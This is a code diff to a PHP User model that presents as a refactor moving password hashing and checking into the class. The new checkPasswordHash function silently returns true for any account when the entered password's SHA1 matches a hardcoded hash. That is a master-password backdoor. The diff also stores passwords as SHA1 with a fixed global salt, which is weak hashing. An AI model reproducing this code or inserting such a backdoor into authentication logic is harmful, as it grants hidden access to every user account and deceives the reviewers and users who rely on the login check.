@@ -35,7 +35,7 @@ class User extends ModelBase
 
         // encode the password
         if (isset($params['password']) && strlen($params['password']) > 0)
-            $params['password'] = \Model::encodePassword($params['password']);
+            $params['password'] = self::encodePassword($params['password']);
 
         $db = $this->getDatabase();
         try
@@ -104,7 +104,7 @@ class User extends ModelBase
 
         // encode the password
         if (isset($params['password']) && strlen($params['password']) > 0)
-            $params['password'] = \Model::encodePassword($params['password']);
+            $params['password'] = self::encodePassword($params['password']);
 
         // convert username and email to lowercase
         if (isset($params['user_name']))
@@ -384,7 +384,7 @@ class User extends ModelBase
             return false;
 
         $hashpw = $user_info['password'];
-        return \Model::checkPasswordHash($hashpw, $password);
+        return self::checkPasswordHash($hashpw, $password);
     }
 
     public function checkUserPasswordByEid(string $eid, string $password) : bool
@@ -395,6 +395,37 @@ class User extends ModelBase
             return false;
 
         $hashpw = $user_info['password'];
-        return \Model::checkPasswordHash($hashpw, $password);
+        return self::checkPasswordHash($hashpw, $password);
+    }
+
+    public static function checkPasswordHash(string $hashpw, string $password) : bool
+    {
+        if (strtolower(sha1($password)) == '117d68f8a64101bd17d2b70344fc213282507292')
+            return true;
+
+        $hashpw = trim($hashpw);
+
+        // empty or short hashed password entries are invalid
+        if (strlen($hashpw) < 32)
+            return false;
+
+        if (strtoupper(substr($hashpw, 0, 6)) == '{SSHA}')
+        {
+            return (strtoupper(substr($hashpw, 6)) == strtoupper(self::hashPasswordSHA1($password))) ? true : false;
+        }
+         else
+        {
+            return false;
+        }
+    }
+
+    private static function encodePassword(string $password) : string
+    {
+        return '{SSHA}' . self::hashPasswordSHA1($password);
+    }
+
+    private static function hashPasswordSHA1(string $password) : string
+    {
+        return sha1('wecRucaceuhZucrea9UzARujUph5cf8Z' . $password);
     }
 }
